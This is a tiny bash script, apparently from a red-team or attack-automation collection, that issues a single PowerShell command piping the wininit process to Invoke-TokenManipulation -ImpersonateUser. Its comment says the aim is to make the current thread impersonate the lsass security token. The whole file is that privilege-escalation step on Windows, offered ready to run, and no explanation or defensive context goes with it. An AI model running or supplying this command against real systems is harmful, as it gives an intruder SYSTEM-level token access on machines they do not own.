#!/bin/bash

: '
ps: Makes the current thread impersonate the lsass security token
'

execute_command "Get-Process wininit | Invoke-TokenManipulation -ImpersonateUser"
create_new_line
